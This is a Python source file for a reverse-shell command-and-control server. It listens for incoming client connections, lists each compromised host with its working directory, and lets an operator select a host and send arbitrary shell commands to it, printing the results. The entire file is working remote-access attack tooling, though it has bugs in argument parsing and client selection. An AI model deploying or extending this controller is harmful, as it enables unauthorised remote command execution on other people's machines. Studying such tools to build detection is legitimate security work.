import socket, threading, time
import sys

SERVER_ADDR = "127.0.0.1"
SERVER_PORT = 8080
BUFFER_SIZE = 1024 * 128 #128KB max size
CURRENT_CONNECTIONS = []
CURRENT_ADDRESSES = []

#If the user starts the server and wants to specify the ip to host on
if len(sys.argv) == 2:
    SERVER_ADDR = sys.argv[1]
elif len(sys.argv) == 3:
    SERVER_ADDR = sys.argv[1]
    SERVER_PORT = sys.argv[2]


server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_sock.bind((SERVER_ADDR, SERVER_PORT))

def startServer():
    server_sock.listen(5)
    print()
    print(f"Server is listening on {SERVER_ADDR}:{SERVER_PORT}")
    print()
    SERVER_UP = True
    try:
        while SERVER_UP:
            client_sock, addr = server_sock.accept()
            # print(f"\nConnection Received From: {addr[0]}:{addr[1]}")
            CURRENT_CONNECTIONS.append(client_sock)
            CURRENT_ADDRESSES.append(addr)
            # print(f"[SERVER] Active Connections: {threading.activeCount() - 6}")
            # print("cmd>")
    except (KeyboardInterrupt, SystemExit, ConnectionAbortedError):
        server_sock.close()
        SERVER_UP = False
        

def handleClient(client_sock,addr):
    while True:
        try:
            user_in = input()
            if user_in == 'exit':
                client_sock.send(user_in.encode())
                break
            elif user_in == '':
                print("No empty commands!")
            elif user_in.split()[0] == "cd":
                client_sock.send(user_in.encode())
                print(f"{addr[0]}>",end='')
                continue
            else:
                client_sock.send(user_in.encode())
                client_sock.settimeout(5.0) #timeout after 5 seconds of no recv
                serv_resp = client_sock.recv(BUFFER_SIZE).decode()
                client_sock.settimeout(None) #reset timeout
                print(f"{serv_resp}")
                print(f"{addr[0]}>",end='')
        except socket.timeout as e:
            print("Process timed out. \n" + str(e))
            print(f"{addr[0]}>",end='')
        except BrokenPipeError as e:
            print(e)
            continue
        except Exception as e:
            print("Error sending command! \n" + str(e))
    

def handleCommand():
    while True:
        try:
            cmd = input("cmd> ")
            if cmd.lower() == "list" or cmd.lower() == "ls":
                list_clients()
            elif "select" in cmd.lower() or "sel" in cmd.lower():
                client,addr = select_client(cmd)
                if client == None:
                    print("Client does not exist!")
                else:
                    handleClient(client,addr)
            elif cmd.lower() == "help":
                print("\nHelp Menu: \n\tUse 'list' to list active connections. \
                    \n\tUse 'select' to choose a client from the list. \
                    \n\tUse 'help' to show this menu. \
                    \n\tUse 'exit' to quit the program. \n")
            elif cmd.lower() == "exit":
                print("[SERVER] Server is closing. Goodbye!")
                #SHUTDOWN ALL CONNECTIONS
                shutdown_clients()
                server_sock.close()
                break
            else:
                print("Command unknwon. Use 'help' to list commands.")
        except Exception as e:
            print("Invalid use of command!" + str(e))


def list_clients():
    out = ""
    results = ""
    i = 0
    for client in CURRENT_CONNECTIONS:
        try:
            cwd = None
            client.send(str.encode('pwd'))
            cwd = client.recv(201480).decode()
            if cwd is None:
                del CURRENT_CONNECTIONS[i]
                del CURRENT_ADDRESSES[i]
        except:
            del CURRENT_CONNECTIONS[i]
            del CURRENT_ADDRESSES[i]
            continue

        results += str(i) + " - " + str(CURRENT_ADDRESSES[i][0]) + ":" + str(CURRENT_ADDRESSES[i][1]) + " @ " + str(cwd) + "\n"
        i+=1

    if len(CURRENT_CONNECTIONS) != 0:
        print("[SERVER] ACTIVE CLIENTS:")
        print(results)
    else:
        print("No active connections!")

def select_client(cmd):
    try:
        target = cmd.replace("select ", "")
        target = cmd.replace("sel ", "")
        target = int(target)
        connection = CURRENT_CONNECTIONS[target]
        addr = CURRENT_ADDRESSES[target]
        print("Connected to: " + str(CURRENT_ADDRESSES[target][0]) + ":" + str(CURRENT_ADDRESSES[target][1]))
        print("\n" + str(CURRENT_ADDRESSES[target][0]) + ">",end = '')
        return connection,addr
    except:
        print("Invalid!")

def create_threads():
    t = threading.Thread(target=startServer)
    t.daemon = True
    t.start()
    time.sleep(1)
    handleCommand()
    # for _ in range(2):
    #     t = threading.Thread(target=thread_selector)
    #     t.daemon = True
    #     t.start()

def shutdown_clients():
    for conn in CURRENT_CONNECTIONS:
        conn.send("SERVER_SHUTDOWN".encode())

if __name__ == "__main__":
    print("[SERVER] Server is starting...")
    create_threads()

